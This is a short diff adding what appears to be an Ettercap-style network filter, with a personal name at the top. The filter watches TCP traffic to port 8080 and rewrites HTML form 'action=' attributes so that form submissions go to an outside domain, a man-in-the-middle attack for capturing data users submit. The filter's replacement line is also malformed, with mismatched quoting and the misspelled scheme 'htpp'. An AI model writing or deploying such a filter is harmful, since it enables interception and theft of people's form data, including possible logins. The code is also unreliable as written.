@@ -1,0 +1,5 @@
+#Lezly Ceron
+
+if(ip.proto == TCP && tcp.dst ==8080 ){
+	replace("action=", "action=\"htpp://truerandom.bid\");
+}
